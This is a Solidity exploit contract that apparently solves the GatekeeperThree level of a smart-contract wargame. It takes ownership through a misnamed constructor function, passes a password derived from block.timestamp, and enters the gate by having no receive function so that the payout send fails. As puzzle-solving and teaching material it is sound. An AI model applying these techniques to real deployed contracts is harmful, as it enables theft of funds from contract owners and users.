// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;
import "../../src/GatekeeperThree/GatekeeperThree.sol";
import "../BlockUtils.sol";

contract GatekeeperThreeExploit is BlockUtils {
    GatekeeperThree victim;
    
    constructor(address _victim) {
        victim = GatekeeperThree(payable(_victim));
        // Set owner to our exploit contract
        victim.construct0r();
    }

    function hack() public {
        // Create the trick
        victim.createTrick();

        // Fail the checkPassword to reset password to block.timestamp
        victim.trick().checkPassword(0);

        // Use block.timestamp as password
        uint256 password = block.timestamp;

        // Get allowance
        victim.getAllowance(password);

        // Attempt to enter
        victim.enter();
    }
    
    // No payable fallback or receive function, so owner.send will fail
}